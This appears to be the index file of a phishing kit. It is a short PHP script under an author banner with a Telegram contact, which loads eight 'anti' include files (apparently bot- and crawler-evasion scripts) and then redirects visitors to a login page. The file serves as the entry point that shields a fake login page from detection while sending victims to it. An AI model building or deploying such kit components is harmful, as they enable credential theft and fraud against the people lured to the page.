<?php

    /*
    ███╗   ███╗██████╗ ██████╗ ██╗██╗  ██╗███╗   ███╗██╗███╗   ██╗██████╗ 
    ████╗ ████║╚════██╗██╔══██╗██║██║  ██║████╗ ████║██║████╗  ██║╚════██╗
    ██╔████╔██║ █████╔╝██║  ██║██║███████║██╔████╔██║██║██╔██╗ ██║ █████╔╝
    ██║╚██╔╝██║ ╚═══██╗██║  ██║██║╚════██║██║╚██╔╝██║╚═╝██║╚██╗██║ ╚═══██╗
    ██║ ╚═╝ ██║██████╔╝██████╔╝███████╗██║██║ ╚═╝ ██║██╗██║ ╚████║██████╔╝
    ╚═╝     ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ 
         c0ded By M3dL4m!n3  Contact Telegram: @M3dL4m1n3
    */
	
	include '../secure/anti1.php';
	include '../secure/anti2.php';
	include '../secure/anti3.php';
	include '../secure/anti4.php';
	include '../secure/anti5.php';
	include '../secure/anti6.php';
	include '../secure/anti7.php';
	include '../secure/anti8.php';

	header('Location: login');

?>